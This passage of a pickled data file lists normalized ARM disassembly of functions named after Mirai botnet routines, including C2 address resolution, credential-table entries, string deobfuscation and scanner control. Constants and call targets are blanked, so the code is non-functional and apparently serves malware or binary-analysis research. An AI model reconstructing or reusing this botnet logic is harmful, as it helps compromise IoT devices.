R12,R12,0\nSTRB~R3,[R12,SP]\nSTRB~R2,[R6,0]\nADD~R5,R7,0\nMOV~R7,R5\nMOV~R4,R4,LSL0\nADD~R4,R4,0\nMOV~R4,R4,ASR0\nMOV~R0,R8\nBL~FOO\nMOV~R1,R0\nMOV~R0,R5\nBL~FOO\nLDRB~R3,[R8,R0]\nMVN~R3,R3\nADD~R3,R10,R3\nAND~R10,R3,0\nSUB~R4,R4,0\nADD~R6,R6,0\nCMP~R5,0\nBNE~FOO\nMOV~R0,R10\nMOV~R1,0\nBL~FOO\nMOV~R0,R0,LSL0\nAND~R0,R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R0,R0,R1\nMOV~LR,PC\nLDR~PC,[R0,-0]\nMOV~R0,R8\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nMOV~R4,R0\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R0,R2,R11\nMOV~R1,0\nBL~FOO\nADD~R0,SP,0\nADD~R0,R0,0\nMOV~R1,R5\nBL~FOO\nTST~R4,0\nMOVNE~R0,0\nBLNE~FOO\nBL~FOO\nBL~FOO\nADD~R4,SP,0\nADD~R4,R4,0\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nLDR~R3,[SP,0]\nCMP~R3,0\nBNE~FOO\nLDR~R12,[SP,0]\nLDR~R0,[R12,0]\nBL~FOO\nCMP~R0,0\nBGT~FOO\nMOV~R0,R4\nLDR~R2,[SP,0]\nLDR~R1,[R2,0]\nBL~FOO\nLDR~R3,[SP,0]\nLDR~R4,[R3,0]\nMOV~R0,R4\nBL~FOO\nMOV~R1,R0\nMOV~R0,R4\nBL~FOO\nBL~FOO\nAND~R4,R0,0\nMOV~R4,R4,LSL0\nADD~R4,R4,0\nADD~R5,SP,0\nADD~R5,R5,0\nMOV~R0,R5\nMOV~R1,R4\nBL~FOO\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R4\nMOV~R6,0\nSTRB~R6,[R3,-0]\nLDR~R1,[SP,0]\nLDR~R0,[R1]\nMOV~R1,R5\nBL~FOO\nBL~FOO\nMOV~R1,0\nBL~FOO\nMOV~R4,R0,LSL0\nADD~R4,R4,0\nMOV~R0,R5\nMOV~R1,R4\nBL~FOO\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R3,R2,R4\nSTRB~R6,[R3,-0]\nMOV~R0,0\nMOV~R1,R5\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nMOV~R1,R0\nMOV~R0,0\nLDR~R2,[SP,0]\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,R0\nBL~FOO\nMOV~R0,0\nBL~FOO\nBL~FOO\nCMP~R0,R6\nBGT~FOO\nBL~FOO\nMOV~R10,R0\nMOV~R0,R6\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nBL~FOO\nBL~FOO\nBL~FOO\nMOV~R8,R6\nMOV~R4,R6\nLDR~R7,<STR>\nMOV~R9,0\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R11,R3,R9\nMOV~R3,0\nADD~R2,SP,0\nADD~R2,R2,0\nSTR~R4,[R3,R2]\nADD~R3,R3,0\nCMP~R3,0\nBNE~FOO\nMOV~R3,R4\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nSTR~R2,[R3,R1]\nADD~R3,R3,0\nCMP~R3,0\nBNE~FOO\nLDR~R3,<STR>\nLDR~R0,[R3]\nCMN~R0,0\nBEQ~FOO\nMOV~R2,R0,LSR0\nMOV~R2,R2,LSL0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R2,R2,R12\nAND~R0,R0,0\nLDR~R3,[R2,-0]\nMOV~R1,0\nORR~R3,R3,R1,LSLR0\nSTR~R3,[R2,-0]\nLDR~R6,<STR>\nLDR~R3,[R6]\nCMN~R3,0\nBNE~FOO\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nMOV~R5,R0\nSTR~R0,[R6]\nCMN~R0,0\nBEQ~FOO\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nORR~R2,R0,0\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nLDR~R3,<STR>\nLDR~R3,[R3]\nCMP~R3,0\nMOVNE~LR,PC\nMOVNE~PC,R3\nMOV~R2,0\nLDR~R3,<STR>\nSTRB~R2,[R3]\nLDR~R0,[R7]\nLDR~R1,<STR>\nADD~R2,R2,0\nBL~FOO\nLDR~R3,<STR>\nLDRB~R3,[R3]\nCMP~R3,0\nBEQ~FOO\nLDR~R0,[R7]\nMOV~R2,R0,LSR0\nMOV~R2,R2,LSL0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R2,R2,R1\nAND~R0,R0,0\nLDR~R3,[R2,-0]\nMOV~R1,0\nORR~R3,R3,R1,LSLR0\nSTR~R3,[R2,-0]\nB~FOO\nLDR~R0,[R7]\nMOV~R2,R0,LSR0\nMOV~R2,R2,LSL0\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R2,R2,R3\nAND~R0,R0,0\nLDR~R3,[R2,-0]\nMOV~R1,0\nORR~R3,R3,R1,LSLR0\nSTR~R3,[R2,-0]\nLDR~R5,<STR>\nLDR~R3,<STR>\nLDR~R0,[R3]\nLDR~R3,[R5]\nCMP~R0,R3\nMOVLT~R0,R3\nSTR~R4,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nADD~R3,SP,0\nADD~R3,R3,0\nSTR~R3,[SP]\nADD~R0,R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R2,SP,0\nADD~R2,R2,0\nMOV~R3,R4\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nCMP~R0,0\nBNE~FOO\nSTRB~R0,[SP,0]\nSTRB~R0,[SP,0]\nMOV~R0,R8\nMOV~R1,0\nBL~FOO\nADD~R8,R8,0\nCMP~R0,0\nBNE~FOO\nLDR~R0,[R5]\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nLDR~R3,<STR>\nLDR~R0,[R3]\nCMN~R0,0\nBEQ~FOO\nMOV~R3,R0,LSR0\nMOV~R3,R3,LSL0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R3,R12\nAND~R2,R0,0\nLDR~R3,[R3,-0]\nMOV~R3,R3,LSRR2\nTST~R3,0\nBEQ~FOO\nMOV~R3,0\nSTR~R3,[SP,0]\nADD~R1,R12,R9\nADD~R2,SP,0\nADD~R2,R2,0\nBL~FOO\nBL~FOO\nBL~FOO\nBL~FOO\nRSB~R0,R10,0\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R2,<STR>\nLDRB~R3,[R2]\nCMP~R3,0\nBEQ~FOO\nSTRB~R4,[R2]\nLDR~R0,[R7]\nMOV~R3,R0,LSR0\nMOV~R3,R3,LSL0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R3,R3,R1\nAND~R2,R0,0\nLDR~R3,[R3,-0]\nMOV~R3,R3,LSRR2\nTST~R3,0\nBNE~FOO\nBL~FOO\nB~FOO\nSTR~R4,[SP,0]\nMOV~R2,0\nSTR~R2,[SP,0]\nADD~R3,SP,0\nADD~R3,R3,0\nSTR~R3,[SP]\nMOV~R1,0\nADD~R3,SP,0\nADD~R3,R3,0\nBL~FOO\nLDR~R3,[SP,0]\nCMP~R3,0\nBEQ~FOO\nLDR~R0,[R7]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R7]\nBL~FOO\nMOV~R1,0\nBL~FOO\nADD~R0,R0,0\nBL~FOO\nB~FOO\nADD~R6,SP,0\nADD~R6,R6,0\nMOV~R0,R6\nBL~FOO\nSTRB~R0,[SP,0]\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nLDR~R5,<STR>\nLDR~R0,[R5]\nLDR~R1,<STR>\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nLDR~R0,[R5]\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nLDRB~R2,[SP,0]\nCMP~R2,0\nBEQ~FOO\nLDR~R0,[R5]\nMOV~R1,R6\nMOV~R3,0\nBL~FOO\nB~FOO\nLDR~R5,<STR>\nLDR~R2,[R5]\nCMN~R2,0\nBEQ~FOO\nMOV~R3,R2,LSR0\nMOV~R3,R3,LSL0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R3,R12\nAND~R2,R2,0\nLDR~R3,[R3,-0]\nMOV~R3,R3,LSRR2\nTST~R3,0\nBEQ~FOO\nBL~FOO\nMOV~R6,R0\nSTR~R4,[R0]\nLDR~R0,[R5]\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nMOV~R3,0\nADD~R3,R3,R2\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R3,[R6]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nB~FOO\nCMP~R0,0\nBNE~FOO\nBL~FOO\nB~FOO\nLDRB~R2,[SP,0]\nLDRB~R3,[SP,0]\nORRS~R2,R2,R3,LSL0\nBNE~FOO\nLDR~R0,[R7]\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nB~FOO\nAND~R3,R2,0\nMOV~R3,R3,LSL0\nORR~R3,R3,R2,LSR0\nSTRB~R3,[SP,0]\nMOV~R2,R3,ASR0\nSTRB~R2,[SP,0]\nCMP~R3,0\nBLS~FOO\nLDR~R0,[R7]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R7]\nSTR~R4,[R6]\nLDRB~R3,[SP,0]\nLDRB~R2,[SP,0]\nLDR~R0,[R7]\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R1,R12,R9\nORR~R2,R3,R2,LSL0\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R3,[R6]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nB~FOO\nCMP~R0,0\nBNE~FOO\nBL~FOO\nB~FOO\nLDR~R0,[R7]\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nLDRB~R2,[SP,0]\nLDRB~R3,[SP,0]\nORR~R2,R2,R3,LSL0\nSTRB~R2,[SP,0]\nMOV~R3,R2,ASR0\nSTRB~R3,[SP,0]\nLDR~R0,[R7]\nMOV~R1,R11\nMOV~R3,0\nBL~FOO\nLDRB~R2,[SP,0]\nLDRB~R3,[SP,0]\nORRS~R1,R2,R3,LSL0\nBEQ~FOO\nMOV~R0,R11\nBL~FOO\nB~FOO\nMOV~R0,0\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p257
L2308L
tp258
a(S'resolve_cnc_addr'
p259
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nBL~FOO\nMOV~R6,R0\nMOV~R0,0\nBL~FOO\nCMP~R6,0\nLDMEQFD~SP!,{R4-R6,PC}\nLDR~R5,[R6,0]\nBL~FOO\nLDR~R4,<STR>\nLDRB~R1,[R6]\nBL~FOO\nLDR~R3,[R5,R0,LSL0]\nSTR~R3,[R4,0]\nMOV~R0,R6\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDRB~R3,[R0]\nLDRB~R2,[R0,0]\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R4,0]\nMOV~R0,0\nBL~FOO\nLDMFD~SP!,{R4-R6,PC}"'
p260
L140L
tp261
a(S'rand_next'
p262
S'"LDR~R1,<STR>\nLDR~R2,[R1]\nEOR~R2,R2,R2,LSL0\nLDR~R0,<STR>\nLDR~R3,[R0]\nSTR~R3,[R1]\nLDR~R1,<STR>\nLDR~R3,[R1]\nSTR~R3,[R0]\nLDR~R3,<STR>\nLDR~R0,[R3]\nSTR~R0,[R1]\nEOR~R0,R0,R0,LSR0\nEOR~R0,R2,R0\nEOR~R0,R0,R2,LSR0\nSTR~R0,[R3]\nRET"'
p263
L68L
tp264
a(S'rand_str'
p265
S'"STMFD~SP!,{R4,R5,LR}\nMOV~R5,R0\nSUBS~R4,R1,0\nLDMLEFD~SP!,{R4,R5,PC}\nCMP~R4,0\nBLE~FOO\nBL~FOO\nSTR~R0,[R5]\nSUB~R4,R4,0\nB~FOO\nCMP~R4,0\nBLE~FOO\nBL~FOO\nSTRB~R0,[R5]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nADD~R5,R5,0\nSUB~R4,R4,0\nB~FOO\nBL~FOO\nSTRB~R0,[R5]\nSUB~R4,R4,0\nCMP~R4,0\nBGT~FOO\nLDMFD~SP!,{R4,R5,PC}"'
p266
L100L
tp267
a(S'rand_alphastr'
p268
S'"STMFD~SP!,{R4-R6,LR}\nSUB~SP,SP,0\nMOV~R5,R0\nMOV~R4,R1\nADD~R0,SP,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nCMP~R4,0\nBLE~FOO\nMOV~R6,R4\nCMP~R4,0\nBLS~FOO\nBL~FOO\nMOV~R1,R5\nMOV~R2,0\nAND~R3,R0,0\nMOV~R0,R0,LSR0\nADD~R12,SP,0\nADD~R3,R12,R3,LSR0\nLDRB~R3,[R3,-0]\nSTRB~R3,[R1]\nADD~R2,R2,0\nCMP~R2,0\nBNE~FOO\nADD~R5,R5,0\nSUB~R4,R6,0\nB~FOO\nBL~FOO\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R5]\nSUB~R4,R4,0\nCMP~R4,0\nBGT~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R6,PC}"'
p269
L148L
tp270
a(S'rand_init'
p271
S'"STMFD~SP!,{R4,R5,LR}\nMOV~R0,0\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nBL~FOO\nMOV~R4,R0\nBL~FOO\nLDR~R5,<STR>\nEOR~R4,R4,R0\nSTR~R4,[R5]\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nLDR~R3,[R5]\nEOR~R0,R0,R3\nLDR~R3,<STR>\nSTR~R0,[R3]\nLDMFD~SP!,{R4,R5,PC}"'
p272
L76L
tp273
a(S'resolv_skip_name'
p274
S'"MOV~R12,R2\nMOV~R3,0\nSTR~R3,[R2]\nMOV~R2,0\nB~FOO\nCMP~R3,0\nBLS~FOO\nMOV~R3,R3,LSL0\nLDRB~R2,[R0,0]\nADD~R3,R3,R2\nSUB~R3,R3,0\nADD~R0,R3,R1\nMOV~R2,0\nB~FOO\nADD~R0,R0,0\nCMP~R2,0\nLDREQ~R3,[R12]\nADDEQ~R3,R3,0\nSTREQ~R3,[R12]\nLDRB~R3,[R0]\nCMP~R3,0\nBNE~FOO\nCMP~R2,0\nLDREQ~R3,[R12]\nADDEQ~R3,R3,0\nSTREQ~R3,[R12]\nRET"'
p275
L108L
tp276
a(S'resolv_entries_free'
p277
S'"STMFD~SP!,{R4,LR}\nSUBS~R4,R0,0\nLDMEQFD~SP!,{R4,PC}\nLDR~R0,[R4,0]\nCMP~R0,0\nBLNE~FOO\nMOV~R0,R4\nBL~FOO\nLDMFD~SP!,{R4,PC}"'
p278
L36L
tp279
a(S'resolv_domain_to_hostname'
p280
S'"STMFD~SP!,{R4,R5,LR}\nMOV~R4,R0\nMOV~R5,R1\nMOV~R0,R1\nBL~FOO\nADD~R1,R4,0\nADD~R0,R0,0\nMOV~R3,0\nB~FOO\nLDRB~R2,[R5]\nCMP~R2,0\nCMPNE~R2,0\nSTREQB~R3,[R4]\nADDEQ~R2,R1,0\nMOVEQ~R4,R1\nMOVEQ~R3,0\nADDNE~R3,R3,0\nANDNE~R3,R3,0\nSTRNEB~R2,[R1]\nMOVNE~R2,R1\nADD~R5,R5,0\nSUB~R0,R0,0\nMOV~R1,R2\nCMP~R0,0\nBGT~FOO\nMOV~R3,0\nSTRB~R3,[R1]\nLDMFD~SP!,{R4,R5,PC}"'
p281
L112L
tp282
a(S'resolv_lookup'
p283
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R10,R3,0\nMOV~R0,R10\nMOV~R1,R4\nBL~FOO\nMOV~R0,R10\nBL~FOO\nADD~R8,R10,R0\nADD~R7,R8,0\nMOV~R6,0\nADD~R0,SP,0\nADD~R0,R0,0\nADD~R3,R0,R6\nMOV~R5,0\nSTR~R5,[R0,R6]\nADD~R3,R3,0\nSTR~R5,[R3]\nSTR~R5,[R3]\nSTR~R5,[R3]\nMOV~R0,R10\nBL~FOO\nADD~R0,R0,0\nSTR~R0,[SP,0]\nBL~FOO\nMOV~R1,0\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nSTR~R0,[SP,0]\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R4,R1,R6\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nMOV~R3,0\nADD~R2,SP,0\nADD~R2,R2,0\nSTRB~R3,[R2,R6]\nSTRB~R5,[R4,0]\nMOV~R3,0\nORR~R3,R3,R3,LSL0\nSTR~R3,[R4,0]\nSTRB~R5,[R4,0]\nMOV~R3,0\nSTRB~R3,[R4,0]\nLDR~R3,[SP,0]\nSTRB~R3,[SP,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[SP,0]\nMOV~R3,0\nSTRB~R3,[SP,0]\nSTRB~R5,[SP,0]\nSTRB~R5,[SP,0]\nSTRB~R3,[SP,0]\nSTRB~R5,[R8,0]\nSTRB~R3,[R7,0]\nSTRB~R5,[R7,0]\nSTRB~R3,[R7,0]\nMOV~R7,0\nMOV~R9,R3\nMOV~R11,0\nMOV~R0,0\nSTR~R0,[SP,0]\nMOV~R1,0\nSTR~R1,[SP,0]\nMOV~R2,0\nSTR~R2,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nCMN~R7,0\nMOVNE~R0,R7\nBLNE~FOO\nMOV~R0,0\nMOV~R1,R0\nMOV~R2,0\nBL~FOO\nMOV~R7,R0\nCMN~R0,0\nBNE~FOO\nMOV~R0,0\nBL~FOO\nB~FOO\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R1,R12,R11\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nADD~R0,R0,0\nBL~FOO\nB~FOO\nMOV~R0,R7\nADD~R1,SP,0\nADD~R1,R1,0\nLDR~R2,[SP,0]\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nADD~R0,R0,0\nBL~FOO\nB~FOO\nMOV~R0,0\nMOV~R1,R7\nMOV~R2,0\nBL~FOO\nORR~R2,R0,0\nMOV~R0,0\nMOV~R1,R7\nBL~FOO\nMOV~R3,0\nLDR~R6,[SP,0]\nADD~R0,SP,0\nADD~R0,R0,0\nADD~R1,R0,R6\nMOV~R4,R3\nSTR~R4,[R3,R1]\nADD~R3,R3,0\nCMP~R3,0\nBNE~FOO\nMOV~R3,R7,LSR0\nAND~R8,R7,0\nMOV~R3,R3,LSL0\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R5,R3,R2\nLDR~R3,[R5,R6]\nMOV~R2,0\nORR~R3,R3,R2,LSLR8\nSTR~R3,[R5,R6]\nADD~R3,SP,0\nADD~R3,R3,0\nLDR~R12,[SP,0]\nADD~R2,R3,R12\nMOV~R3,0\nADD~R0,SP,0\nADD~R0,R0,0\nSTR~R3,[R0,R12]\nSTR~R4,[R2,0]\nSTR~R2,[SP]\nADD~R0,R7,0\nMOV~R2,R4\nMOV~R3,R4\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nCMP~R0,0\nBEQ~FOO\nLDR~R3,[R5,R6]\nMOV~R3,R3,ASRR8\nTST~R3,0\nBEQ~FOO\nADD~R5,SP,0\nSTR~R4,[SP]\nSTR~R4,[SP,0]\nMOV~R0,R7\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R4,R0\nMOV~R0,R10\nBL~FOO\nADD~R0,R0,0\nCMP~R4,R0\nBCC~FOO\nADD~R10,R5,0\nMOV~R0,R10\nBL~FOO\nADD~R0,R10,R0\nADD~R6,R0,0\nLDRB~R3,[R5]\nLDRB~R2,[SP,0]\nORR~R3,R3,R2,LSL0\nLDR~R1,[SP,0]\nCMP~R3,R1\nBNE~FOO\nLDRB~R2,[R5,0]\nLDRB~R3,[R5,0]\nORRS~R2,R2,R3,LSL0\nBEQ~FOO\nAND~R3,R2,0\nMOV~R3,R3,LSL0\nORR~R8,R3,R2,LSR0\nLDR~R9,[SP,0]\nLDR~R11,[SP,0]\nB~FOO\nADD~R10,SP,0\nMOV~R0,R6\nMOV~R1,R10\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R2,R3,R9\nBL~FOO\nADD~R12,SP,0\nADD~R12,R12,0\nLDR~R3,[R12,R9]\nADD~R4,R6,R3\nADD~R5,R4,0\nLDRB~R3,[R6,R3]\nLDRB~R2,[R4,0]\nORR~R3,R3,R2,LSL0\nCMP~R3,0\nBNE~FOO\nLDRB~R3,[R4,0]\nLDRB~R2,[R4,0]\nORR~R3,R3,R2,LSL0\nCMP~R3,0\nBNE~FOO\nLDRB~R3,[R4,0]\nLDRB~R2,[R4,0]\nORR~R3,R3,R2,LSL0\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nAND~R2,R2,0\nORR~R2,R2,R3,LSR0\nCMP~R2,0\nBNE~FOO\nLDRB~R3,[R4,0]\nSTRB~R3,[R12,R11]\nADD~R2,R12,R11\nLDRB~R3,[R5,0]\nSTRB~R3,[R2,0]\nLDRB~R3,[R5,0]\nSTRB~R3,[R2,0]\nLDRB~R3,[R5,0]\nSTRB~R3,[R2,0]\nLDR~R0,[SP,0]\nLDRB~R1,[R0]\nMOV~R1,R1,LSL0\nLDR~R0,[R0,0]\nADD~R1,R1,0\nBL~FOO\nLDR~R1,[SP,0]\nSTR~R0,[R1,0]\nLDRB~R3,[R1]\nADD~R12,SP,0\nADD~R12,R12,0\nLDR~R2,[R12,R11]\nSTR~R2,[R0,R3,LSL0]\nADD~R3,R3,0\nSTRB~R3,[R1]\nLDRB~R3,[R4,0]\nLDRB~R2,[R4,0]\nORR~R3,R3,R2,LSL0\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nAND~R2,R2,0\nORR~R2,R2,R3,LSR0\nADD~R6,R5,R2\nB~FOO\nMOV~R0,R5\nMOV~R1,R10\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R2,R3,R9\nBL~FOO\nADD~R12,SP,0\nADD~R12,R12,0\nLDR~R3,[R12,R9]\nADD~R6,R5,R3\nSUB~R3,R8,0\nMOV~R3,R3,LSL0\nMOV~R8,R3,LSR0\nMOV~R3,0\nCMP~R8,R3\nBNE~FOO\nB~FOO\nCMP~R9,0\nADDNE~R9,R9,0\nBNE~FOO\nMOV~R0,R7\nBL~FOO\nLDR~R0,[SP,0]\nLDRB~R4,[R0]\nCMP~R4,0\nBNE~FOO\nBL~FOO\nSTR~R4,[SP,0]\nLDR~R0,[SP,0]\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p284
L1212L
tp285
a(S'consume_any_prompt'
p286
S'"MOV~R2,R0\nLDR~R3,[R0,0]\nSUB~R0,R3,0\nCMP~R0,0\nBLE~FOO\nADD~R3,R0,R2\nLDRB~R3,[R3,0]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBNE~FOO\nB~FOO\nADD~R3,R0,R2\nLDRB~R3,[R3,0]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBNE~FOO\nADD~R0,R0,0\nCMN~R0,0\nMOVNE~PC,LR\nB~FOO\nSUBS~R0,R0,0\nBNE~FOO\nMOV~R0,0\nRET"'
p287
L144L
tp288
a(S'can_consume'
p289
S'"MOV~R3,R0\nADD~R0,R0,0\nLDR~R3,[R3,0]\nADD~R0,R0,R3\nADD~R2,R2,R1\nCMP~R0,R2\nMOVLS~R0,0\nMOVHI~R0,0\nRET"'
p290
L36L
tp291
a(S'scanner_kill'
p292
S'"STR~LR,[SP,-0]\nLDR~R3,<STR>\nLDR~R0,[R3]\nMOV~R1,0\nBL~FOO\nLDR~PC,[SP]"'
p293
L24L
tp294
a(S'deobf'
p295
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R4,R0\nMOV~R6,R1\nBL~FOO\nSTR~R0,[R6]\nADD~R0,R0,0\nBL~FOO\nMOV~R5,R0\nLDR~R2,[R6]\nMOV~R1,R4\nADD~R2,R2,0\nBL~FOO\nLDR~R3,[R6]\nCMP~R3,0\nBLE~FOO\nMOV~R0,0\nMOV~R1,R3\nLDRB~R3,[R0,R5]\nEOR~R3,R3,0\nSTRB~R3,[R0,R5]\nADD~R0,R0,0\nCMP~R1,R0\nBGT~FOO\nMOV~R0,R5\nLDMFD~SP!,{R4-R6,PC}"'
p296
L100L
tp297
a(S'add_auth_entry'
p298
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nMOV~R9,R0\nMOV~R11,R1\nMOV~R7,R2,LSL0\nMOV~R7,R7,LSR0\nLDR~R5,<STR>\nLDR~R6,<STR>\nLDR~R1,[R6]\nMOV~R1,R1,LSL0\nLDR~R0,[R5]\nADD~R1,R1,0\nBL~FOO\nMOV~R8,R0\nSTR~R0,[R5]\nLDR~R4,[R6]\nMOV~R4,R4,LSL0\nMOV~R10,SP\nMOV~R0,R9\nMOV~R1,SP\nBL~FOO\nSTR~R0,[R8,R4]\nLDR~R3,[R6]\nLDR~R2,[R5]\nMOV~R3,R3,LSL0\nADD~R3,R3,R2\nLDR~R2,[SP]\nSTRB~R2,[R3,0]\nLDR~R4,[R6]\nMOV~R4,R4,LSL0\nLDR~R3,[R5]\nADD~R4,R4,R3\nMOV~R0,R11\nMOV~R1,SP\nBL~FOO\nSTR~R0,[R4,0]\nLDR~R3,[R6]\nLDR~R2,[R5]\nMOV~R3,R3,LSL0\nADD~R3,R3,R2\nLDR~R2,[SP]\nSTRB~R2,[R3,0]\nLDR~R1,[R6]\nLDR~R3,[R5]\nLDR~R0,<STR>\nMOV~R1,R1,LSL0\nADD~R1,R1,R3\nLDRB~R3,[R0]\nLDRB~R2,[R0,0]\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nLDR~R1,[R6]\nLDR~R12,[R5]\nLDRB~R3,[R0]\nLDRB~R2,[R0,0]\nORR~R3,R3,R2,LSL0\nADD~R3,R7,R3\nMOV~R2,R1,LSL0\nADD~R2,R2,R12\nSTRB~R3,[R2,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R2,0]\nADD~R1,R1,0\nSTR~R1,[R6]\nLDRB~R3,[R0]\nLDRB~R2,[R0,0]\nORR~R3,R3,R2,LSL0\nADD~R7,R7,R3\nSTRB~R7,[R0]\nMOV~R7,R7,ASR0\nSTRB~R7,[R0,0]\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p299
L300L
tp300
a(S'setup_connection'
p301
S'"STMFD~SP!,{R4-R6,LR}\nSUB~SP,SP,0\nMOV~R6,R0\nMOV~R3,0\nSTR~R3,[SP]\nSTR~R3,[SP,0]\nSTR~R3,[SP,0]\nSTR~R3,[SP,0]\nLDR~R0,[R0,0]\nCMN~R0,0\nBLNE~FOO\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSTR~R0,[R6,0]\nCMN~R0,0\nBEQ~FOO\nMOV~R5,0\nSTR~R5,[R6,0]\nADD~R0,R6,0\nMOV~R1,0\nBL~FOO\nLDR~R4,[R6,0]\nMOV~R0,R4\nMOV~R1,0\nMOV~R2,R5\nBL~FOO\nORR~R2,R0,0\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nMOV~R3,0\nSTRB~R3,[SP]\nSTRB~R5,[SP,0]\nLDR~R3,[R6,0]\nSTR~R3,[SP,0]\nLDR~R3,[R6,0]\nSTRB~R3,[SP,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[SP,0]\nLDR~R3,<STR>\nLDR~R3,[R3]\nSTR~R3,[R6,0]\nMOV~R3,0\nSTR~R3,[R6,0]\nLDR~R0,[R6,0]\nMOV~R1,SP\nMOV~R2,0\nBL~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R6,PC}"'
p302
L208L
tp303
a(S'recv_strip_null'
p304
S'"STMFD~SP!,{R4,LR}\nMOV~R4,R1\nBL~FOO\nCMP~R0,0\nLDMLEFD~SP!,{R4,PC}\nMOV~R2,0\nMOV~R1,0\nLDRB~R3,[R2,R4]\nCMP~R3,0\nSTREQB~R1,[R2,R4]\nADD~R2,R2,0\nCMP~R0,R2\nBNE~FOO\nLDMFD~SP!,{R4,PC}"'
p305
L56L
tp306
a(S'scanner_init'
p307
